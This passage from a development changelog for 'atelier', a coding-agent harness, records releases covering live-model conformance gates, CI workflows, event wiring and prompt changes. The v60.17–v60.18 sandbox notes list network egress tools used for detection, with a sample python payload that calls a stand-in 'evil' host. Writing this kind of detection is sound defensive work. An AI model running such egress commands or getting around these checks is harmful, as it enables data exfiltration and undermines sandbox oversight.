Drives the five Phase B priority canonical tasks (t01, t02, t05, t06, t10) against `anthropic:claude-haiku-4-5`, folds the per-task `RunReport.envelope_conformance` snapshots into one aggregate `ConformanceRingBuffer`, projects it into per-strategy `ConformanceSummary` rows, and writes the JSON to `$ATELIER_PHASE_B_SUMMARY_PATH` (consumed by the nightly workflow). Records-only — does not assert against the floor.

### Calibration discipline

The workflow's `CALIBRATION_PHASE: "true"` env var keeps `all_passed: true` regardless of measured rate for the first 7 nights. After enough evidence accumulates, the maintainer flips it to `"false"` and the workflow asserts. The seed `tests/phase_b_gate/last_run.json` ships with `calibration_phase: true`, `status: "yellow"`, empty summaries, and `all_passed: true` — schema-valid, schema-readable, ready for the first real run to overwrite.

### Lessons applied

- **L-D-1** — live API calls from day 1; `#[ignore]`-gated test ready, secret-gated workflow step ready.
- **L-D-3** — `ConformanceStatus` is a tier/fallback lattice (Green/Yellow/Red), same shape as `VerificationTier` and `LspInstallOutcome`.
- **L-D-5** — `ConformanceStatus::wire_label()` agreement test landed in the first commit.
- **L-D-6** — PROVISIONAL `PHASE_B_CONFORMANCE_FLOOR` + records-only calibration window; the `CALIBRATION_PHASE` toggle gates the assertion.

### OpenAI half deferred

Per user direction during Phase B closeout: the hosted-OpenAI half (originally Track B of the closeout plan) is dropped — the user does not have a paid OpenAI account. The workflow's structure leaves room for a second secret-gated step against `OPENAI_API_KEY` if/when a maintainer wires one in; the schema's `providers_tested` array is already `minItems: 1` (so any future expansion is additive). LiteLLM-proxy and local-OpenAI-compat paths remain runnable via the existing `phase_a_live_openai_compat_*` `#[ignore]`-gated tests for local development.

### Verification

- `cargo test -p atelier-core --lib` — 808 pass (was 802; six new tests in `protocol_conformance::tests`).
- `cargo test -p atelier-cli --bin conformance_status` — 7 pass.
- `cargo test --workspace --lib` — full suite green.
- `cargo test -p atelier-cli --test run_integration` — 80 pass + 12 ignored (the new `phase_b_live_anthropic_conformance` joins the existing 11 live-API `#[ignore]`-gated tests).
- `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `make check` — 25/25 schemas valid, 59/59 artifacts validated.

### Phase B closeout progress

- **#1** §2 mechanical gate end-to-end across three strategies — **done** v60.23.
- **#2** measured real-model conformance with calibrated threshold — **done in code** v60.24; data-blocked on 7-night calibration + `ANTHROPIC_API_KEY` maintainer wiring.
- #3 §7 Tier-1 + hallucinating-agent — pending Tracks C1/C2/C3.
- #4 DoD checklist reconciliation — done v60.21.
- #5 `cargo fmt` / `clippy` / `test --workspace` / `make check` all green — preserved.
- **#6** `phase_b_gate_status` binary emits `Phase B: GREEN` — binary ships in v60.24; emits `YELLOW (calibration phase)` against the seed artifact and will emit `GREEN` after the calibration window completes.

## v60.23 — 2026-05-18 (Phase B Track D: §2 mechanical gate green across all three strategies)

Closes `tasks/todo.md:220` (§2 mechanical gate snapshot tests across all three strategies). Pure-function encode/parse round-trip tests for `NativeTool` / `JsonSentinel` / `RegexProse` had been green since v60.7 (mock-model fixtures), but the end-to-end half — a runner driving the §2.5 loop through each carrier — was the missing piece. v60.23 lands it. Acceptance criterion #1 from `tasks/phase_b_closeout.md` flips green.

### New `Runner::with_starting_strategy_override(Strategy)` builder

The `MockAdapter`'s declared capabilities always resolve to `Strategy::NativeTool` (its `Capabilities::native_tool_use` is `Supported`), so `JsonSentinel` and `RegexProse` are unreachable through normal profile resolution. The new builder pins `active_strategy` after the profile loads — explicitly tagged as a test seam, `#[allow(dead_code)]` for the binary build, with doc comments stating production callers should not set it (probe-on-first-use + conformance tracker own strategy selection in real runs).

### Three new end-to-end tests

In `crates/atelier-cli/tests/run_integration.rs`:

- `mock_drives_t01_via_strategy_native_tool_phase_b_two_gate` — envelope rides as a `harness_meta` tool call alongside the two real writes.
- `mock_drives_t01_via_strategy_json_sentinel_phase_b_two_gate` — envelope rides in `assistant_text` between the `<<<harness_meta>>>` / `<<<end>>>` sentinel tags (via `encode_json_sentinel`); `tool_calls` carry only the real writes.
- `mock_drives_t01_via_strategy_regex_prose_phase_b_two_gate` — envelope rides in `assistant_text` as tagged sections (via `encode_regex_prose`); `tool_calls` carry only the real writes. `claimed_done` + `claimed_changes` are both representable in RegexProse (the lossy strategy drops only `plan_update` / `constraints_acknowledged`, neither of which the t01 envelope carries).

Each test scripts a single-turn agent solving t01 honestly (write `utils.py` + `tests/test_utils.py`), copies the canonical fixture to a tempdir, drives the §2.5 loop via the named strategy, and asserts `final_state == Done` + exactly one `Event::VerificationPassed { Tier3Textual, file_count = 2 }` + zero `VerificationFailed`. Tests share a `t01_honest_writes()` helper for the file contents, a `run_t01_with_strategy()` runner-setup helper, and an `assert_phase_b_two_gate_pass()` post-condition so a future spec revision tightening the gate is a one-line change.

### Lesson applied

**L-D-7** — *claimed-but-broken surfaces are half a bug; integration-test the actual wire.* Pre-v60.23 the encode/parse pair tests proved the round-trip *in isolation*; the runner's parse arm walking the envelope back out of each carrier was untested end-to-end. The new tests prove the integration, not just the unit.

### Verification

- `cargo test -p atelier-cli --test run_integration mock_drives_t01_via_strategy` — 3/3 pass.
- `cargo test -p atelier-core --lib` — 802 pass (no regression from v60.22's 802 baseline).
- `cargo fmt --check` clean.
- `cargo clippy --workspace --all-targets -- -D warnings` clean.

### Phase B closeout progress

Of the five Phase B closeout acceptance criteria:
- **#1** `todo.md:220` `[~]` → `[x]` — **done** ✅ (this release).
- #2 measured real-model conformance — pending Track A.
- #3 §7 Tier-1 + hallucinating-agent — pending Tracks C1/C2/C3.
- #4 DoD checklist reconciliation — done at v60.21.
- #5 `cargo fmt` / `clippy` / `test --workspace` / `make check` all green — preserved.
- #6 `phase_b_gate_status` binary emits `Phase B: GREEN` — pending Track A.

## v60.22 — 2026-05-18 (Phase B Day-0 prep: `Event::RequestLspInstall` + `LspInstallResolved` variants)

Day-0 sequential prep commit for the Phase B closeout per `tasks/phase_b_closeout.md`. Per **L-D-2** any PR that introduces a new `Event::*` variant lands in its own commit with empty match arms in all four sinks, so the four parallel Phase B bundles (Tracks A / B / C1 / D) don't collide on `crates/atelier-core/src/session.rs::Event`, the GUI `bridge_event`, the Svelte `state.ts applyEvent` / `projectEvent`, or the TUI `apply` / `project_event`. This commit pins the wire shapes for the §7 Tier-1 LSP first-use install flow that Track C1 will fill in.

### Two new `Event` variants — wire shapes pinned, behaviour stubbed

- `Event::RequestLspInstall { language: String, candidate_packages: Vec<String> }` — emitted by Track C1's runner when it observes an unverified language (today only TypeScript) without a cached `LspApprovals` entry. The UI renders a first-use modal listing `candidate_packages` (e.g. `["typescript-language-server"]`); the approval round-trip lands as a sibling Tauri/TUI command in C1 proper.
- `Event::LspInstallResolved { language: String, outcome: LspInstallOutcome }` — terminal marker for the install flow above. `LspInstallOutcome` is a tier/fallback ladder per **L-D-3**: `Installed` / `Declined` / `AlreadyPresent` / `Failed`, with `wire_label()` returning stable snake-case strings and an agreement test pinning the labels.

### New module: `crates/atelier-core/src/lsp/`

Today the module carries only `LspInstallOutcome` + its wire-label agreement test. Track C1 fleshes it out with `LspServerHandle`, `launch_typescript_server`, `LspApprovals`, and `schemas/audit/lsp_install.v1.json`. Stub-then-grow lets the prep commit ship without compile-time tangling against the future spike.

### Four sinks updated in lockstep

- **`session.rs::Event::kind()`** — two new arms returning `"RequestLspInstall"` / `"LspInstallResolved"`. New `lsp_install_event_kinds_are_stable` regression test pins both strings (matches the existing `concurrent_edit_outcome_wire_labels_are_stable` shape).
- **GUI `bridge_event`** (`crates/atelier-gui/src/lib.rs`) — two new JSON arms; `RequestLspInstall` ships `{language, candidate_packages}`; `LspInstallResolved` ships `{language, outcome: outcome.wire_label()}`.
- **TUI `apply`** (`crates/atelier-tui/src/lib.rs`) — the new variants join the IllegalTransitionAttempted / Cancelled / AdapterSwapped / AgentStalled / Shutdown "log-only, no state mutation" or-arm. The approval modal `InputMode` arm lands with Track C1.
- **TUI `project_event`** — one-line event-log rendering: `"{language}: install {pkgs}"` / `"{language}: {outcome}"`.
- **Svelte `applyEvent`** (`state.ts`) — log-only arms today; the approval modal in `App.svelte` lands with Track C1.
- **Svelte `projectEvent`** — one-line event-log rendering symmetric with the TUI.

### Verification

- `cargo build` clean on all four crates (`atelier-core` / `atelier-cli` / `atelier-gui` / `atelier-tui`).
- `cargo test -p atelier-core` — **802 → 804 tests pass** (two new: `lsp::tests::lsp_install_outcome_wire_labels_are_stable` and `session::tests::lsp_install_event_kinds_are_stable`).
- `cargo test -p atelier-gui --lib` — 29 tests pass.
- `cargo test -p atelier-tui --lib` — 94 tests pass.
- `cargo fmt --check` clean.
- `cargo clippy --workspace --all-targets -- -D warnings` clean.

### What this enables

Tracks A / B / C1 / D can now land on day 1 of Phase B without colliding on `session.rs` or any of the four sinks. C1 fills in the `LspServerHandle` + `LspApprovals` + sandboxed install runner; C2 wires the Tier-1 verify producer that emits `RequestLspInstall` on first use; C3's hallucinating-agent fixture asserts the install→verify→discrepancy flow end-to-end.

## v60.21 — 2026-05-18 (DoD checklist: spec becomes authoritative; todo.md mirror collapsed)

Docs-only follow-on to v60.20. Closes a bookkeeping debt surfaced when the user asked "are phases A, B and C fully closed out?" the day after v60.20 shipped: the DoD checklist existed in **two copies** — one in `coding-harness-spec.md:927` as `## Definition of done`, one in `tasks/todo.md:428` as `## DoD checklist mirror` — both with every line `[ ]` despite Phase A green (v60.19), §3 GUI 10-file rename green (v56), §5 context-panel API assertions green (v53), and crash-and-recover green (v60.7). Discharges **L-D-2 / L-D-7** against the project's own bookkeeping: two-copy registries drift; the symptom looked like nothing was done.

### Reality reconciliation against the spec's `## Definition of done`

Each line moved from `[ ]` to its true state with a terse evidence pointer (commit ref, changelog entry, or closeout-plan section):

- `[x]` Phase A gate green — v60.19
- `[ ]` Phase B gate green — five open items; closeout plan at `tasks/phase_b_closeout.md`
- `[x]` Schema validation passing — `make check`: 58/58 artifacts as of v60.20
- `[~]` Canonical workload priority subset Anthropic + LiteLLM via API — Anthropic half green v60.18; LiteLLM half deferred to Phase B Track B
- `[x]` Crash-and-recover preserves state — v60.7 `sigkill_then_resume_*` integration test
- `[x]` §3 GUI 10-file rename gate green — v56
- `[x]` §5 context-panel API assertions green — v53 + v44 cache-bust ledger
- `[ ]` Backend milestone met — blocked on Phase B
- `[ ]` Cold start GUI <4 s — never formally measured against the reference machine
- Full-v1 lines (5×) — all remain `[ ]` (Phase B/D/E gates still open; only Anthropic in adapter trio; §8 / perf budgets / PROVISIONAL calibration are downstream)

### `tasks/todo.md` mirror collapsed to a pointer

The "mirror" pattern was the bug. Two checklists with identical content drift by default; v60.20 was the day the gap got loud enough to notice. The mirror is replaced with a 2-line note pointing at `coding-harness-spec.md:927` as authoritative, plus an explicit instruction not to re-introduce it. The spec is the contract; the build tracker references it. Single source of truth, no copies to keep in sync.

This is a worked example of the lessons-as-discipline pattern from v60.20: **L-D-2** says shared registries drift if you fork them, and the DoD checklist was exactly such a fork. **L-D-7** says claimed-but-broken surfaces are half a bug — the all-`[ ]` mirror was a "claimed nothing's done" surface against a half-shipped product.

### Files touched

- **`coding-harness-spec.md`** — `## Definition of done` lines updated against reality with evidence pointers; section preamble clarifies that this is authoritative and `tasks/todo.md` no longer carries a copy.
- **`tasks/todo.md`** — `## DoD checklist mirror` retitled `## Definition of done` and collapsed to a 2-line pointer at the spec section.

### Verification

`make check` green (no rig structure changes; the spec is a markdown file, not validated against a schema). No Rust changes, so `cargo fmt --check` / `cargo clippy` / `cargo test --workspace` unchanged from v60.20's green baseline.

## v60.20 — 2026-05-18 (`atelier find` ships + §5 mental-model goes live + Phase B closeout plan)

Three bundles land together. First, the deferred `atelier find --path <P>` CLI subcommand from v60.7's §5 UX-target row (`tasks/todo.md:304`) — the `FindProbe` + `FindProbeLog` instrumentation has been on disk since v60.7, but the user-facing entry point was punted. v60.20 closes it. Second, the §5 mental-model panel flips from "off in v0" (text editable but never injected) to live: when `enabled && text.trim() != ""` the runner prepends a second System message on every per-turn `adapter.chat` call carrying the user's text. Third, this revision's process work — ten Phase-A close-out lessons promoted into `tasks/lessons.md` with stable IDs `L-D-1` … `L-D-10`, Phase D/E/F sections of `tasks/todo.md` carrying `### Discipline carry-overs from Phase A–C` references at phase entry, and a new `tasks/phase_b_closeout.md` plan with five tracks (A/B/C1/C2/C3/D), ratified pre-work decisions, and a risk register.

### `atelier find` subcommand (`crates/atelier-cli/src/find.rs` + `main.rs` + `lib.rs`)

The §5 UX target *"find what agent knows about file X" median <5 s* was greenlit at v60.7 with the on-disk `FindProbe` + `FindProbeLog` format frozen and a canonical fixture (`tests/workload/canonical/t13_find_what_agent_knows/`) that referenced the forward-looking CLI via `--dry-run`. v60.20 wires up that CLI.

- **New module `crates/atelier-cli/src/find.rs`** (~370 lines + tests). `pub fn run_find(args)` is the entry point reachable via the new `atelier find` subcommand. Walks the most-recent (or `--session <UUID>`-named) session under `<workspace>/.atelier/sessions/`, scans the persisted `session.json::conversation[]` for the path, and returns matches with a one-line excerpt. Total elapsed wall-clock (request → last match) is recorded as a `FindProbe` in the session's `find_probes.json` so the median-elapsed-ms target has data to compute against.
- **Match shape:** substring search across three fields per conversation entry — any text content, any serialized `tool_calls[].arguments`, any `tool_call_id`. Each match carries `{entry_index, kind: "content" | "tool_call_args" | "tool_call_id", excerpt}`.
- **"No session present" semantics:** exits `0` cleanly when the workspace has no sessions yet. A fresh repo doesn't have an agent to query, and that's not an error — it's the expected state pre-first-run.
- **`--dry-run` flag** for the t13 canonical fixture: skips the `find_probes.json` append so `make check` runs don't bloat the seeded probe log.
- **Exit codes:** `0` query completed (0 matches still counts as success), `1` query errored (malformed session.json, unreadable workspace), `2` bad argument (missing `--path`, unknown flag).
- **Three integration tests** (`atelier_find_returns_matches_from_session_conversation`, `atelier_find_exits_zero_when_workspace_has_no_sessions`, `atelier_find_dry_run_does_not_mutate_probe_log`) plus the existing t13 fixture now exercises a real subcommand rather than the placeholder it had.

### §5 mental-model panel — actually injected now (`crates/atelier-core/src/mental_model.rs` + `crates/atelier-cli/src/runner.rs` + GUI/TUI cost-disclosure)

The panel landed in v60.7 with the explicit caveat that v0 *"does NOT inject the text into the prompt; the cost-disclosure badge reads '0 tokens per turn at present' until that ships."* v60.20 ships it.

- **Runner injection** (`crates/atelier-cli/src/runner.rs`). On each turn, `session_dispatcher.snapshot_mental_model()` returns the current `MentalModelSnapshot`. When `enabled && !text.trim().is_empty()`, the runner builds a per-turn `messages_for_call` vec that inserts a second System message immediately after the atelier system prompt (so `messages[0]` is the §2 protocol preamble and `messages[1]` is the user's mental model). The history `messages` vec is **NOT** mutated — the on-disk conversation transcript stays free of the panel preamble. Anthropic concatenates multiple system entries cleanly; OpenAI-compat keeps them as separate `system`-role rows; both wire shapes are acceptable.
- **Pre-seed at construction:** new `Runner::with_initial_mental_model(text, enabled)` builder lets callers seed the panel before the loop runs. Errors surface as `RunError::Config` because they only fire on text-safety violations (Trojan-Source bytes, etc.) — a misuse, not a runtime issue. The GUI/TUI's existing `set_mental_model` round-trip still works mid-run.
- **System-message text** carries explicit framing: *"User-supplied mental model / working hypothesis. The user maintains this in the Atelier §5 mental-model panel; it is additional context layered on top of the §2 protocol instructions above. Treat it as guidance, not as ground truth: the user may be wrong, and you should still verify claims via tools."* Prevents the model from treating the panel as authoritative ground truth.
- **Cost disclosure across all three frontends** updates from "0 tokens per turn at present" → live cost label:
  - **GUI** (`MentalModelPane.svelte`, `state.ts`): badge renders `~N tokens / turn` when injected, `0 tokens / turn` otherwise. Toast on save reads `saved — ~N tokens / turn injected` / `saved (enabled, but text is empty — nothing injected)` / `saved (disabled)`.
  - **TUI** (`lib.rs::render_help_left`): footer hint reads `mm:on(~Ntk/turn)` when injecting, `mm:on(0/turn)` when enabled-but-empty.
  - **Doc comments** in `crates/atelier-core/src/mental_model.rs` updated to reflect v60.20 reality (the v0 caveat is gone).
- **Three new integration tests** in `crates/atelier-cli/tests/run_integration.rs`: `mental_model_text_injected_as_second_system_message_when_enabled` (asserts the System message lands at `messages[1]` with the framing preamble), `mental_model_text_not_injected_when_disabled` (negative control), `mental_model_text_not_injected_when_empty_even_if_enabled` (the empty-text edge case). Shared helper `run_with_mental_model_and_capture` captures every `adapter.chat` call's message vec for assertion.

### Process artifacts — Phase D/E/F lessons + Phase B closeout plan (`tasks/lessons.md` + `tasks/todo.md` + `tasks/phase_b_closeout.md`)

Ten lessons distilled from v52–v60.17 — four deep-scan audit rounds, four parallel-bundle releases, the rmcp foundation, the §15 built-ins-as-MCP refactor, the Phase A nightly gate, and the live-API t01 bring-up. Each lesson has a stable ID so `tasks/todo.md` Phase D/E/F sections can reference them at phase entry without duplicating content:

- **L-D-1** — Mock-only gates lie; live-probe muscle has to be part of each phase.
- **L-D-2** — Parallel bundles must be file-disjoint, especially on shared registries (`session.rs::Event`, `bridge_event`, `state.ts applyEvent/projectEvent`, TUI `apply`/`project_event`).
- **L-D-3** — Tier/fallback ladders are the project's signature pattern; reuse the shape (typed enum + `wire_label()` + agreement test + `*Hint` projection + colour-coded badge + "fallback was used" bus event).
- **L-D-4** — Atomicity / fsync / TOCTOU bugs land late; route all writes through `atomic_write` + `fsync_dir_best_effort`.
- **L-D-5** — Wire-format hygiene needs an agreement test, not a convention.
- **L-D-6** — PROVISIONAL constants need a nightly calibration job, not a future-self promise.
- **L-D-7** — A "claimed but broken" surface is half a bug; integration-test the actual wire (the v60.20 mental-model work is itself a discharge of this lesson — v60.7's panel was claimed-but-broken until this commit).
- **L-D-8** — Adapter parity surfaces only when the same workload runs against ≥2 adapters.
- **L-D-9** — Priority lattices need to be written as a table on day 1.
- **L-D-10** — Worktree-isolation hygiene needs a CI step, not a convention.

Lessons render in the existing `**Failure** / **Prevention**` format used for v50/v51 entries. Phase D/E/F sections of `tasks/todo.md` carry a `### Discipline carry-overs from Phase A–C` block referencing 4–5 lesson IDs each — landed in this session and now baked into the commit alongside the Phase B closeout plan.

**Phase B closeout plan** (`tasks/phase_b_closeout.md`, ~205 lines) lays out five tracks for closing the §2 real-model conformance ≥95% gate and the §7 hallucinating-agent Tier-1 gate:

- **Track A** — §2 real-model conformance harness + nightly gate. Sibling of v60.13's Phase A nightly. 7-night calibration window then asserts at `max(0.95, observed_p5)`.
- **Track B** — Live OpenAI-compat canonical runs (t01/t02/t05/t06/t10 against hosted OpenAI via `secrets.OPENAI_API_KEY`).
- **Track C1** — LSP client infrastructure (Q3 was resolved at v60.12 as prompt-on-first-use; this implements it). `LspApprovals` mirrors `McpApprovals` bit-for-bit. Spike against `async-lsp` first, mirroring the v60.10 rmcp spike pattern.
- **Track C2** — TypeScript Tier-1 verify path; **also fixes the v60.8 follow-on** where `verify_pass` is never called from `runner.rs`. Both land in the same commit per **L-D-7**.
- **Track C3** — Hallucinating-agent fixture + gate. New `Discrepancy::HallucinatedSymbol` variant. Priority lattice locked via paired test per **L-D-9**.
- **Track D** — §2 mechanical-gate completion (three strategies × end-to-end) + DoD checklist mirror reconciliation.

Day-0 prep commit (new `Event::RequestLspInstall` + `Event::LspInstallResolved` variants with empty match arms in all four sinks) lands sequentially per **L-D-2**; A/B/C1/D parallelise on day 1; C2 then C3 sequential. Risk register flags the four likely surprises (async-lsp dep maturity, sub-95% conformance, npm flakiness on CI, worktree-isolation drift).

### Files touched

- **`crates/atelier-cli/src/find.rs`** *(new, ~370 lines)* — `atelier find` implementation.
- **`crates/atelier-cli/src/main.rs`** — `find` subcommand wiring + help text.
- **`crates/atelier-cli/src/lib.rs`** — `pub mod find;` export.
- **`crates/atelier-cli/src/runner.rs`** — `with_initial_mental_model` builder + per-turn second-System-message injection.
- **`crates/atelier-cli/tests/run_integration.rs`** — three `atelier_find_*` tests + three `mental_model_*` injection tests.
- **`crates/atelier-core/src/mental_model.rs`** — doc-comment updates (v0 caveat removed; v60.20 reality landed).
- **`crates/atelier-gui/ui/src/lib/components/MentalModelPane.svelte`** — live cost-disclosure badge + per-state toast.
- **`crates/atelier-gui/ui/src/lib/state.ts`** — `MentalModel` type doc-comment update.
- **`crates/atelier-tui/src/lib.rs`** — `render_help_left` cost-disclosure suffix.
- **`tasks/lessons.md`** — appended v52–v60.17 section with L-D-1 … L-D-10.
- **`tasks/todo.md`** — Phase B `**Closeout plan:**` pointer.
- **`tasks/phase_b_closeout.md`** *(new, ~205 lines)* — five-track closeout plan.

### Verification

`cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings`, `cargo test --workspace` (1063 workspace tests across all crates) all green. New test counts: atelier-cli integration **+6** (3 find + 3 mental-model); atelier-cli unit and atelier-core unchanged. `make check` green (58/58 artifacts validated, 112 rig tests passed, 13/13 canonical dry-runs incl. t13 now exercising the real `atelier find` subcommand).

## v60.19 — 2026-05-18 (Phase A closed: live-API nightly gate wired)

Closes Phase A. Every Phase A mechanical gate is now backed by an automated nightly run. The new piece is the **`phase_a_live_anthropic` gate** in `.github/workflows/nightly_phase_a_gate.yml`: it runs the five priority `phase_a_live_anthropic_t<NN>_…` integration tests with `--include-ignored`, gated on `secrets.ANTHROPIC_API_KEY`. When the secret is absent (forks, before-the-maintainer-wires-it main) the gate records `status: skipped` instead of `failed` so `all_passed` stays green and the workflow doesn't go red on the first firing.

### Workflow changes (`.github/workflows/nightly_phase_a_gate.yml`)

- New step `Gate — phase A live (Anthropic)` with id `phase_a_live`. Mirrors the existing `Gate — mcp integration (npx)` shape (continue-on-error, time + exit-code captured to step outputs) plus an extra `is_skipped` boolean that the compose step reads.
- The step's preamble checks `${ANTHROPIC_API_KEY:-}` before invoking `cargo test`; absent secret → exit 0 with `is_skipped=true`; present secret → real run, normal pass/fail mapping.
- Compose step learned a `phase_a_live_status` arm: `skipped` when the gate self-reported skip, otherwise the existing `status_for` map. `all_passed` flips false only on `failed`, not on `skipped` — same semantics as the MCP gate but stricter, because a green-when-skipped semantics is appropriate for a paid live-API gate.
- New gate row in the emitted `tests/phase_a_gate/last_run.json`: `phase_a_live_anthropic` with the normal `status` + `duration_secs` fields. `schemas/ci/phase_a_gate.v1.json` already accepts any snake_case name (open pattern) and already enumerates `passed | failed | skipped`, so no schema change was needed.
- `Surface failure` step's error message extended to name the new gate alongside the existing ones.

### Seed artifact

`tests/phase_a_gate/last_run.json` gains a sixth row, `phase_a_live_anthropic` with `status: skipped` and a details note pointing the maintainer at the secret-wiring step. The seed validates against `schemas/ci/phase_a_gate.v1.json` (`58/58 artifacts validated`).

### Tracker updates

`tasks/todo.md` `[~]` rows at the §2.5 mechanical gate (line 151) and the §1 BYOM mechanical gate (line 176) flip to `[x]`. Both reference v60.12 (Mock half) + v60.18 (live Anthropic half) + v60.19 (CI wiring). The Status block at the top of `tasks/todo.md` is rewritten to declare Phase A closed; Phase B is now the active scope.

### Workspace gates (all green)

- `cargo fmt --check`
- `cargo clippy --workspace --all-targets -- -D warnings`
- `cargo test --workspace` — 1048 tests
- `make check` — 21 schemas + 58 artifacts + 112 rig self-tests + 13 canonical fixtures
- All five `phase_a_live_anthropic_t<NN>_…` tests still green (verified separately under v60.18)

### Phase A close-out — what remains

The harness side of Phase A is done. The single remaining maintainer-side action is wiring `ANTHROPIC_API_KEY` into the GitHub repo's Actions secrets so the new gate runs against the live API. Until then the artifact carries `status: skipped` on every firing — the gate is wired but inert. Once the secret lands, the next nightly run will exercise t01 / t02 / t05 / t06 / t10 against `anthropic:claude-haiku-4-5` and commit the result back to `main`.

The deferred Track B half (OpenAI-compat / LiteLLM live runs) is **not** part of Phase A close — Phase A's gate text names "the Anthropic adapter" specifically. The five `phase_a_live_openai_compat_t<NN>_…` `#[ignore]`-gated tests exist and are runnable locally against Ollama / LM Studio / vLLM / sglang / OpenAI itself, but the matching CI gate becomes a Phase B follow-on (paired with the §2 real-model conformance gate scaffolding).

## v60.18 — 2026-05-18 (Phase A canonical priority subset green against Anthropic live)

All five priority canonical tasks now pass end-to-end against `anthropic:claude-haiku-4-5`. This closes the Phase A `[~]` mechanical-gate items at lines 151 + 174 of `tasks/todo.md`: *"the state machine drives t01, t02, t05, t06, t10 end-to-end against the Anthropic adapter without bypassing any transition"*.

| task | run | wall-clock |
|---|---|---:|
| t01 add_pure_function | ✓ | 47s |
| t02 rename_symbol_multi_file | ✓ (passed first try after fixes; verified twice) | 40s / 87s |
| t05 fix_bug_from_failing_test | ✓ | 33s |
| t06 add_cli_flag | ✓ | 50s |
| t10 implement_from_spec (LRUCache) | ✓ | 36s |

### Two more fixes surfaced by t02

**1. `extract_bare_host` false-positives on filenames with TLD-like extensions** (`crates/atelier-core/src/tools/shell.rs`).

The v60.17 charset filter let `README.md`, `orders/cart.py`, and `pkg.test` through as candidate hostnames — they're alphanumeric+dot, and `.md`/`.py`/`.test` are all plausible TLDs (or look like them). The bare-host walk now only runs when the *command name itself* is a known egress utility (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `telnet`, `ftp`, `ping`, `dig`, `host`, `nslookup`, `axel`, `aria2`, `lftp`). The scheme-URL extraction (`http(s)://…`) stays unconditional so embedded `python -c "urllib.urlopen('https://evil/x')"` is still caught regardless of command. Defense-in-depth: the proxy env-var fallback (`http_proxy=http://127.0.0.1:1`) continues to block any HTTP egress from interpreters / dynamic clients. New helpers `first_command_name()` (strips `KEY=value` env assignments) and `is_known_egress_command()` (basename-match against the list). Three new regression tests pin the filename / env-prefix / basename-match shapes.

**2. System-prompt completion clause strengthened** (`crates/atelier-cli/src/runner.rs`).

`build_atelier_system_prompt` previously said "MUST invoke `harness_meta` … on the turn that completes the task." The t02 trace showed the model completing the rename across 9 files, confirming via grep, then burning the remaining turn budget trying to run pytest under the sandbox — and refusing to claim done because verification was incomplete. New explicit clause: *"If you believe the task is complete but couldn't fully verify (sandbox blocked pytest, getcwd warning, missing tool), STILL emit `harness_meta` with `claimed_done: true`. Add an `uncertainty` entry describing what you couldn't verify. The harness's §7 verifier will catch any inconsistency."* Same clarification cascaded into the JsonSentinel + RegexProse strategy clauses for symmetry.

### t02 turn-cap raised

t02 touches 8+ files. Even with the harness working end-to-end, Haiku 4.5 takes ~16–20 turns of read+edit+verify before claiming done. Bumped `tests/workload/canonical/t02_rename_symbol_multi_file/meta.json::turn_cap` from the default 20 → 30. (t12 already uses 25, t13 uses 12; per-task variation is the established convention.)

### Live-API budget burn

~$0.15 of Anthropic credit across the t02 investigation (3 runs while the system prompt / egress parser was being adjusted) plus ~$0.02 for the t05/t06/t10/re-t01 confirmations. Total live-API spend across the v60.15–v60.18 closeout is ~$0.20.

### Workspace gates

- `cargo fmt --check` clean
- `cargo clippy --workspace --all-targets -- -D warnings` 0 warnings
- `cargo test --workspace` 1048 passing (atelier-core 797 → 800; the three new shell tests)
- All five `phase_a_live_anthropic_t*` tests pass with `--ignored`

### Phase A status

Two mechanical-gate rows at lines 151 + 174 flip from `[~]` to `[x]`. Remaining Phase A items are maintainer-side wiring (the `phase_a_live_anthropic_*` job in `.github/workflows/nightly_phase_a_gate.yml` gated on `secrets.ANTHROPIC_API_KEY`; the equivalent `phase_a_live_openai_compat_*` gate that's still deferred).

## v60.17 — 2026-05-18 (Track B green for t01: §11 sandbox fixes + §2 envelope tool advertised + atelier system prompt)

`phase_a_live_anthropic_t01_add_pure_function` now passes end-to-end against `anthropic:claude-haiku-4-5`. Four layered fixes resolved successive blockers surfaced by the live re-probe after v60.16:

### 1. §11 — `extract_bare_host` false-positive on `python -c` arguments (`crates/atelier-core/src/tools/shell.rs`)

The bare-host parser flagged `sys.path.insert(0,` as a network destination — first character alphanumeric, contains a dot, last segment has letters. It then rejected every `shell` call that contained an embedded `python -c "..."` payload as `SandboxViolation: network egress to sys.path.insert(0,`. DNS hostnames are `[A-Za-z0-9.-]` (plus optional `:port`); the parser now rejects any candidate containing characters outside that charset. Regression test `first_external_destination_ignores_python_dash_c_dotted_identifiers` pins the bug + three nearby false-positive shapes.

### 2. §11 — macOS sandbox profile missing homebrew prefixes (`crates/atelier-core/src/sandbox.rs`)

`MACOS_SYSTEM_READ_SUBPATHS` listed only `/usr/lib`, `/usr/share`, `/usr/libexec`, `/usr/bin`, `/bin`, `/System/Library`, `/Library/Frameworks`, `/private/var/db/dyld`. Homebrew installs to `/opt/homebrew/` (Apple Silicon) and `/usr/local/` (Intel); without read access there, any homebrew-installed runtime fails dyld with "file system sandbox blocked open()" trying to load its own framework files. Added both prefixes — read-only grants; the existing write-deny still applies, so a sandboxed process can use the toolchain but not modify it. Without this, any macOS developer on Apple Silicon ran into the same wall the t01 probe did.

### 3. §2 — `harness_meta` tool was never advertised to the model (`crates/atelier-core/src/protocol_strategy.rs`, `crates/atelier-cli/src/runner.rs`)

The spec line 4 reads "Native tool call (`harness_meta` tool). Cleanest." but the runner only passed the §15 built-in tools (read_file, write_file, …) to `adapter.chat()`. The model had no idea the §2 envelope channel existed. New `protocol_strategy::harness_meta_tool_spec()` returns a `ToolSpec` whose `input_schema` mirrors `schemas/model_protocol/envelope.v1.json`; the runner builds a per-turn `turn_tools_spec` that conditionally prepends it when `active_strategy == NativeTool`. The list is recomputed per turn because the §1 conformance tracker can degrade strategy mid-run. Unit test `harness_meta_tool_spec_round_trips_a_real_envelope_through_its_schema` pins the schema by validating a real `Envelope` against it (including `additionalProperties: false`).

### 4. §2 — runner emitted no system prompt at all (`crates/atelier-cli/src/runner.rs`)

Advertising `harness_meta` wasn't enough — across 23 tool calls in the post-fix-3 live probe the model never invoked it. Tool descriptions alone don't communicate "this is **the** way you signal completion." New `build_atelier_system_prompt(workspace, strategy)` produces a strategy-aware system message that teaches:
1. The workspace root (repo-relative paths).
2. The §2 completion contract — under `NativeTool` it names `harness_meta` by name; under `JsonSentinel` it describes the `<<<harness_meta>>>{...}<<<end>>>` carrier; under `RegexProse` it describes the `DONE:` + `CHANGED-FILES:` tags.
